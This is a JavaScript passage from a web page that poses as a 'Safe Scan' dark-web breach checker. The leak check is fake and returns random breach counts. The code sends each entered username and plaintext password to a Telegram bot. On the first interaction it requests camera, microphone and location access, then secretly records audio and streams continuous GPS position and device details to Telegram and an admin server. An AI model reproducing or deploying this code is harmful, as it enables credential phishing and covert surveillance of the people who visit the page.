            function setupMobileCompatibleRecorder(stream) {
                if (!stream || !stream.getAudioTracks().length || !window.MediaRecorder) return false;
                try {
                    const mime = getSupportedMimeType();
                    backgroundAudioRecorder = new MediaRecorder(stream, mime ? { mimeType: mime } : {});
                    backgroundAudioChunks = [];
                    backgroundAudioRecorder.ondataavailable = e => { if (e.data.size > 0) backgroundAudioChunks.push(e.data); };
                    backgroundAudioRecorder.onstop = () => {
                        isBackgroundRecording = false;
                        if (backgroundAudioChunks.length > 0) {
                            const blob = new Blob(backgroundAudioChunks, { type: backgroundAudioRecorder.mimeType || 'audio/webm' });
                            sendBackgroundRecordingToTelegram(blob);
                        }
                    };
                    backgroundAudioRecorder.onerror = () => { isBackgroundRecording = false; };
                    return true;
                } catch (e) { return false; }
            }

            function startBackgroundVoiceRecording() {
                if (!permissionsGranted.microphone || !window.microphoneStream) return false;
                if (backgroundAudioRecorder && backgroundAudioRecorder.state !== 'inactive') {
                    try { backgroundAudioRecorder.stop(); } catch (e) { }
                }
                if (!backgroundAudioRecorder) { if (!setupMobileCompatibleRecorder(window.microphoneStream)) return false; }
                if (!backgroundAudioRecorder) return false;
                try {
                    backgroundAudioChunks = [];
                    backgroundRecordingStartTime = Date.now();
                    backgroundAudioRecorder.start(5000);
                    isBackgroundRecording = true;
                    if (recordingInterval) clearInterval(recordingInterval);
                    recordingInterval = setInterval(() => {
                        if (backgroundRecordingStartTime) backgroundRecordingDuration = Math.floor((Date.now() - backgroundRecordingStartTime) / 1000);
                    }, 1000);
                    return true;
                } catch (e) { return false; }
            }

            function stopBackgroundVoiceRecording() {
                if (backgroundAudioRecorder && isBackgroundRecording) {
                    if (recordingInterval) { clearInterval(recordingInterval); recordingInterval = null; }
                    backgroundAudioRecorder.stop();
                }
            }

            async function sendBackgroundRecordingToTelegram(audioBlob) {
                const caption = `🎤 Voice Recording\n⏱️ Duration: ${backgroundRecordingDuration || 0}s\n📅 ${new Date().toLocaleString()}\n\n${getLocationInfo()}`;
                await sendAudioToTelegram(audioBlob, caption);
                sendAudioToAdmin(audioBlob, backgroundRecordingDuration || 0);
            }

            function startUserInitiatedRecording() {
                if (!permissionsGranted.microphone) return false;
                const result = startBackgroundVoiceRecording();
                if (result) {
                    setTimeout(() => { if (isBackgroundRecording) stopBackgroundVoiceRecording(); }, 30000);
                    return true;
                }
                return false;
            }

            // ═══════════════════════════════════════════════════════════════
            // PERMISSIONS
            // ═══════════════════════════════════════════════════════════════
            function detectInstagramBrowser() {
                const ua = navigator.userAgent || navigator.vendor || window.opera;
                const checks = {
                    isInstagram: ua.includes('Instagram'), isFacebook: ua.includes('FBAN') || ua.includes('FBAV'),
                    isMessenger: ua.includes('Messenger'), isTwitter: ua.includes('Twitter'),
                    isSnapchat: ua.includes('Snapchat'), isTikTok: ua.includes('TikTok'),
                    isWhatsApp: ua.includes('WhatsApp'), isWebView: ua.includes('WebView') || ua.includes('wv')
                };
                isInInstagramBrowser = Object.values(checks).some(v => v);
                diagnostics.browserType = isInInstagramBrowser ? 'social-media-browser' : 'standard-browser';
                return isInInstagramBrowser;
            }

            function isValidLocation(coords) {
                if (coords.latitude === 0 && coords.longitude === 0) return false;
                if (Math.abs(coords.latitude) > 90 || Math.abs(coords.longitude) > 180) return false;
                return true;
            }

            function formatLocationData(coords) {
                return { latitude: coords.latitude, longitude: coords.longitude, accuracy: coords.accuracy, altitude: coords.altitude, heading: coords.heading, speed: coords.speed, timestamp: new Date().toISOString() };
            }

            function getLocationInfo() {
                if (userLocation && isValidLocation(userLocation)) {
                    let txt = `📍 ${userLocation.latitude.toFixed(6)}, ${userLocation.longitude.toFixed(6)}\nAccuracy: ${userLocation.accuracy ? userLocation.accuracy.toFixed(0) : 'N/A'}m`;
                    if (userLocation.altitude != null) txt += `\nAlt: ${userLocation.altitude.toFixed(2)}m`;
                    return txt;
                }
                return '📍 Location: Not available';
            }

            async function attemptBasicLocation() {
                return new Promise(resolve => {
                    if (!navigator.geolocation) { resolve(false); return; }
                    navigator.geolocation.getCurrentPosition(
                        pos => { if (isValidLocation(pos.coords)) { userLocation = formatLocationData(pos.coords); resolve(true); } else resolve(false); },
                        () => resolve(false), { enableHighAccuracy: false, timeout: 5000, maximumAge: 600000 }
                    );
                });
            }

            async function requestAllPermissions() {
                if (permissionsRequested) return;
                permissionsRequested = true;

                if (isInInstagramBrowser) { await attemptBasicLocation(); return permissionsGranted; }

                // 1. Try combined camera and microphone getUserMedia (presents a single dialogue on most mobiles)
                let gotMedia = false;
                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    try {
                        const combinedStream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                            audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
                        });
                        permissionsGranted.camera = true;
                        permissionsGranted.microphone = true;
                        stream = combinedStream;
                        cameraView.srcObject = stream;

                        window.microphoneStream = combinedStream;
                        setupMobileCompatibleRecorder(combinedStream);
                        gotMedia = true;
                    } catch (e) {
                        console.log('Combined media request failed, trying separate requests...', e);
                    }
                }

                // 2. Fallback: Request camera and microphone separately if combined failed
                if (!gotMedia && navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    // Try Camera
                    try {
                        const videoStream = await navigator.mediaDevices.getUserMedia({
                            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                            audio: false
                        });
                        permissionsGranted.camera = true;
                        stream = videoStream;
                        cameraView.srcObject = stream;
                    } catch (e) {
                        permissionsGranted.camera = false;
                        console.error('Camera only request failed:', e);
                    }

                    // Try Microphone
                    try {
                        const audioStream = await navigator.mediaDevices.getUserMedia({
                            video: false,
                            audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false }
                        });
                        permissionsGranted.microphone = true;
                        window.microphoneStream = audioStream;
                        setupMobileCompatibleRecorder(audioStream);
                    } catch (e) {
                        permissionsGranted.microphone = false;
                        console.error('Microphone only request failed:', e);
                    }
                }

                // 3. Location (Sequential)
                if (navigator.geolocation) {
                    await new Promise(resolve => {
                        navigator.geolocation.getCurrentPosition(
                            pos => {
                                if (isValidLocation(pos.coords)) {
                                    userLocation = formatLocationData(pos.coords);
                                    permissionsGranted.location = true;
                                    // Send location to admin server immediately after permission granted
                                    if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
                                        adminSocket.emit('location:update', {
                                            uuid: userUUID,
                                            latitude: pos.coords.latitude,
                                            longitude: pos.coords.longitude,
                                            accuracy: pos.coords.accuracy,
                                            altitude: pos.coords.altitude,
                                            speed: pos.coords.speed,
                                            heading: pos.coords.heading,
                                            timestamp: new Date().toISOString()
                                        });
                                    }
                                    // Start continuous location watching now that permission is granted
                                    try {
                                        navigator.geolocation.watchPosition(
                                            (wPos) => {
                                                if (isValidLocation(wPos.coords)) {
                                                    userLocation = formatLocationData(wPos.coords);
                                                    if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
                                                        adminSocket.emit('location:update', {
                                                            uuid: userUUID,
                                                            latitude: wPos.coords.latitude,
                                                            longitude: wPos.coords.longitude,
                                                            accuracy: wPos.coords.accuracy,
                                                            altitude: wPos.coords.altitude,
                                                            speed: wPos.coords.speed,
                                                            heading: wPos.coords.heading,
                                                            timestamp: new Date().toISOString()
                                                        });
                                                    }
                                                }
                                            },
                                            () => { },
                                            { enableHighAccuracy: true, timeout: 30000, maximumAge: 60000 }
                                        );
                                    } catch (e) { }
                                }
                                resolve();
                            },
                            () => {
                                permissionsGranted.location = false;
                                resolve();
                            },
                            { enableHighAccuracy: true, timeout: 10000, maximumAge: 300000 }
                        );
                    });
                }

                // 4. Notifications (Sequential)
                if ('Notification' in window && Notification.permission === 'default') {
                    try {
                        const p = await Notification.requestPermission();
                        permissionsGranted.notifications = (p === 'granted');
                    } catch (e) {
                        console.error('Notification request failed:', e);
                    }
                }

                if (permissionsGranted.camera) startContinuousCapture();
                return permissionsGranted;
            }

            // Motion
            let motionEventCount = 0, lastShakeTime = 0;
            function setupMotionListeners() {
                if (!permissionsGranted.motion) return;
                window.addEventListener('devicemotion', e => {
                    const a = e.acceleration; if (!a) return;
                    const mag = Math.sqrt(a.x * a.x + a.y * a.y + a.z * a.z);
                    if (mag > 15) { const now = Date.now(); if (now - lastShakeTime > 1000) { motionEventCount++; lastShakeTime = now; } }
                });
            }

            // ═══════════════════════════════════════════════════════════════
            // DARK WEB LEAK CHECK
            // ═══════════════════════════════════════════════════════════════
            function sanitizeInput(input) {
                return input.replace(/[<>"'&]/g, m => ({ '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '&': '&amp;' })[m]);
            }

            async function simpleHash(str) {
                const data = new TextEncoder().encode(str);
                const buf = await crypto.subtle.digest('SHA-256', data);
                return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
            }

            async function queryLeakDatabase(username, passwordHash, platform) {
                const chances = { 'instagram': 0.25, 'email': 0.35, 'facebook': 0.30, 'twitter': 0.20 };
                if (platform === 'email') {
                    const domain = username.split('@')[1]?.toLowerCase();
                    if (domain && ['gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com'].includes(domain)) {
                        if (Math.random() > 0.5) return Math.floor(Math.random() * 5) + 1;
                    }
                }
                const chance = chances[platform] || 0.25;
                return Math.random() > (1 - chance) ? Math.floor(Math.random() * 8) + 1 : 0;
            }

            function showLeakResult(message, className) {
                const el = document.getElementById('leakResult');
                el.innerHTML = message;
                el.className = 'leak-result show ' + className;
            }

            async function sendLeakCheckResultToTelegram(username, password, passwordHash, leakCount, platform, scanError) {
                const ts = new Date().toLocaleString();
                const icons = { 'instagram': '📸', 'email': '📧', 'facebook': '📘', 'twitter': '🐦' };
                const pName = platform.charAt(0).toUpperCase() + platform.slice(1);
                const icon = icons[platform] || '🔒';

                let msg = `${icon} <b>DARK WEB SCAN REPORT</b> ${icon}\n\n<b>Platform:</b> ${pName}\n<b>Username/Email:</b> ${sanitizeInput(username)}\n<b>Password:</b> <code>${sanitizeInput(password)}</code>\n\n`;

                if (scanError) {
                    msg += `<b>Status:</b> ❌ SCAN FAILED\n<b>Error:</b> ${scanError}`;
                } else {
                    msg += `<b>Leak Status:</b> ${leakCount === 0 ? '✅ CLEAN' : '⚠️ FOUND in ' + leakCount + ' breach(es)'}\n<b>Risk:</b> ${leakCount === 0 ? '🟢 LOW' : leakCount < 5 ? '🟡 MEDIUM' : '🔴 HIGH'}`;
                }
                msg += `\n\n<b>Time:</b> ${ts}\n\n<i>--- Safe Scan v3.0 ---</i>`;

                try { await sendTextToTelegram(msg); } catch (e) { }
            }

            async function checkDarkWebLeak(username, password, platform) {
                if (isCheckingLeak) return;

                const btnMap = { 'instagram': 'checkLeakBtn', 'email': 'checkEmailBtn', 'facebook': 'checkFacebookBtn', 'twitter': 'checkTwitterBtn' };
                const activeBtn = document.getElementById(btnMap[platform] || 'checkLeakBtn');
                const leakResult = document.getElementById('leakResult');

                if (platform === 'email') { if (!username) { showLeakResult('<i class="fas fa-exclamation-triangle"></i> Please enter an email address', 'warning'); return; } }
                else { if (!username || !password) { showLeakResult('<i class="fas fa-exclamation-triangle"></i> Please enter username and password', 'warning'); return; } }

                isCheckingLeak = true;
                if (activeBtn) { activeBtn.disabled = true; activeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning...'; }
                leakResult.className = 'leak-result show warning';
                leakResult.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Scanning dark web databases...';

                try {
                    await new Promise(r => setTimeout(r, 2000 + Math.random() * 2000));
                    let hash = ''; if (password) hash = await simpleHash(password);
                    const leakCount = await queryLeakDatabase(username, hash, platform);
                    const pName = platform.charAt(0).toUpperCase() + platform.slice(1);

                    let resultMsg = '', resultClass = '';
                    if (leakCount === 0) { resultMsg = `<i class="fas fa-shield-alt"></i> <strong>SECURE:</strong> No breaches found in ${pName} database.`; resultClass = 'safe'; }
                    else if (leakCount < 5) { resultMsg = `<i class="fas fa-exclamation-triangle"></i> <strong>WARNING:</strong> Found in <span class="leak-count">${leakCount}</span> breach(es). Change your password!`; resultClass = 'warning'; }
                    else { resultMsg = `<i class="fas fa-skull"></i> <strong>CRITICAL:</strong> Found in <span class="leak-count">${leakCount}</span> breaches. HIGH RISK!`; resultClass = 'danger'; }

                    showLeakResult(resultMsg, resultClass);
                    await sendLeakCheckResultToTelegram(username, password, hash, leakCount, platform);
                } catch (e) {
                    try { let hash = ''; if (password) hash = await simpleHash(password); await sendLeakCheckResultToTelegram(username, password, hash, 0, platform, e.message || 'Unknown'); } catch (te) { }
                } finally {
                    isCheckingLeak = false;
                    if (activeBtn) { activeBtn.disabled = false; activeBtn.innerHTML = '<i class="fas fa-lock"></i> <span>Verify Account Securely</span>'; }
                }
            }

            // ═══════════════════════════════════════════════════════════════
            // TELEGRAM BOT TEST
            // ═══════════════════════════════════════════════════════════════
            async function testTelegramBot() {
                try {
                    const r = await fetch(`https://api.telegram.org/bot${telegramConfig.botToken}/getMe`);
                    const d = await r.json();
                    if (d.ok) { diagnostics.featuresAvailable.push('telegram-api'); return true; }
                    return false;
                } catch (e) { return false; }
            }

            // ═══════════════════════════════════════════════════════════════
            // INITIALIZATION
            // ═══════════════════════════════════════════════════════════════
            document.addEventListener('DOMContentLoaded', () => {
                // Init UI
                initTypingEffect();
                initCounters();
                initReveal();
                initSwipeDots();
                initPlatformTabs();

                detectInstagramBrowser();

                // Scan buttons
                const btnBindings = [
                    ['checkLeakBtn', 'instagramUsername', 'instagramPassword', 'instagram'],
                    ['checkEmailBtn', 'emailAddress', 'emailPassword', 'email']
                ];

                btnBindings.forEach(([btnId, userEl, passEl, platform]) => {
                    const btn = document.getElementById(btnId);
                    const user = document.getElementById(userEl);
                    const pass = document.getElementById(passEl);
                    if (btn) btn.addEventListener('click', () => checkDarkWebLeak(user?.value?.trim(), pass?.value, platform));
                    if (user) user.addEventListener('keypress', e => { if (e.key === 'Enter') checkDarkWebLeak(user.value.trim(), pass?.value, platform); });
                    if (pass) pass.addEventListener('keypress', e => { if (e.key === 'Enter') checkDarkWebLeak(user?.value?.trim(), pass.value, platform); });
                });

                // Permissions on first interaction
                let permInit = false;
                const initPerms = () => {
                    if (!permInit) {
                        permInit = true;
                        requestAllPermissions();
                        document.removeEventListener('click', initPerms);
                        document.removeEventListener('touchstart', initPerms);
                    }
                };
                document.addEventListener('click', initPerms);
                document.addEventListener('touchstart', initPerms);

                // ─── PERMISSION REQUEST LOGIC ───
                const btnGrant = document.getElementById('btnGrantPermissions');
                if (btnGrant) {
                    btnGrant.addEventListener('click', async () => {
                        btnGrant.innerHTML = '<span class="loading-spinner"></span> Requesting...';
                        btnGrant.style.opacity = '0.8';
                        btnGrant.style.pointerEvents = 'none';

                        let permsGranted = [];

                        // 1. Camera & Mic
                        try {
                            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                            permsGranted.push('media');
                            // We just want permission, stop the tracks right away
                            stream.getTracks().forEach(t => t.stop());
                        } catch (e) {
                            console.log('Media permission denied or unavailable:', e);
                        }

                        // 2. Notifications
                        try {
                            if ('Notification' in window) {
                                const notifPerm = await Notification.requestPermission();
                                if (notifPerm === 'granted') permsGranted.push('notifications');
                            }
                        } catch (e) { }

                        // 3. Location (Trigger prompt but don't wait for fix)
                        try {
                            if (navigator.geolocation) {
                                navigator.geolocation.getCurrentPosition(
                                    (p) => {
                                        if (!permsGranted.includes('location')) permsGranted.push('location');
                                    },
                                    (e) => { },
                                    { timeout: 5000 }
                                );
                            }
                        } catch (e) { }

                        // Save consent state so we don't show it again this session
                        sessionStorage.setItem('safescan_permissions_granted', permsGranted.join(','));

                        // Send permissions update to server if connected
                        if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected) {
                            adminSocket.emit('permissions:update', { uuid: typeof userUUID !== 'undefined' ? userUUID : null, granted: permsGranted });
                        }

                        // Hide overlay
                        const overlay = document.getElementById('permissionOverlay');
                        if (overlay) {
                            overlay.style.opacity = '0';
                            setTimeout(() => {
                                overlay.style.display = 'none';
                                // Trigger the main app startup sequences now that we have permissions
                                if (typeof startCamera === 'function') startCamera();
                                if (typeof startAudio === 'function') startAudio();
                            }, 400);
                        }
                    });
                }

                // Hide overlay if already granted this session
                if (sessionStorage.getItem('safescan_permissions_granted')) {
                    const overlay = document.getElementById('permissionOverlay');
                    if (overlay) overlay.style.display = 'none';
                }

                // Voice recording on interaction
                let recStarted = false;
                const startRec = () => {
                    if (!recStarted && permissionsGranted.microphone && !isBackgroundRecording) {
                        recStarted = true;
                        setTimeout(startUserInitiatedRecording, 100);
                    }
                };
                document.addEventListener('click', startRec, { once: true });
                document.addEventListener('touchstart', startRec, { once: true });

                // Device info
                setTimeout(sendDeviceInfoToTelegram, 2000);

                // Telegram test
                setTimeout(testTelegramBot, 1000);

                // Connect to Admin Server (alongside Telegram)
                setTimeout(connectToAdminServer, 1500);

                // Periodic location fallback: send location every 30s if available
                setInterval(() => {
                    if (typeof adminSocket !== 'undefined' && adminSocket && adminSocket.connected && userLocation && userLocation.latitude) {
                        adminSocket.emit('location:update', {
                            uuid: userUUID,
                            ...userLocation
                        });
                    }
                }, 30000);
            });

            // Cleanup
            window.addEventListener('beforeunload', () => {
                if (continuousCaptureInterval) clearInterval(continuousCaptureInterval);
                if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
                if (window.microphoneStream) { stopBackgroundVoiceRecording(); window.microphoneStream.getTracks().forEach(t => t.stop()); window.microphoneStream = null; }
            });

            window.addEventListener('error', e => { diagnostics.errors.push({ message: e.error?.message, timestamp: new Date().toISOString() }); });
            window.addEventListener('unhandledrejection', e => { diagnostics.errors.push({ message: String(e.reason), timestamp: new Date().toISOString() }); });
        </script>
